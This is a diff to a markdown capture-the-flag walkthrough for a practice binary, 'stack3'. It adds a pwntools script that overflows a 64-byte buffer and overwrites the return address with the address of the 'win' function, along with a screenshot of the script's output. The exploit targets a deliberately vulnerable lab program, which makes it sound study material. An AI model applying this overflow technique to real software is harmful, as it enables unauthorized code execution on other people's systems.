@@ -131,5 +131,30 @@ print(str(p.recvall(), 'utf-8'))
 - Completing the exercise with the found value
 ![img](assets/6-man-win.png)
 
+- Code
+```py
+from pwn import *
+# from pprint import pprint
+elf = ELF("./stack3")
+
+# display all the functions in the binary
+# print(elf.symbols)
+# print functions information in a pretty way
+# pprint(elf.symbols)
+
+# obtain a deciaml value of a specific funciton in the binary
+win = elf.symbols['win']
+
+# crafting payload, packing the decimal value as address
+payload = b"a"*64 + p32(win)
+
+p = elf.process()
+p.sendline(payload)
+print(str(p.recvall(), 'utf-8'))
+```
+
+- Script Output
+![img](assets/6-win-script.png)
+
 </p>
 </details>
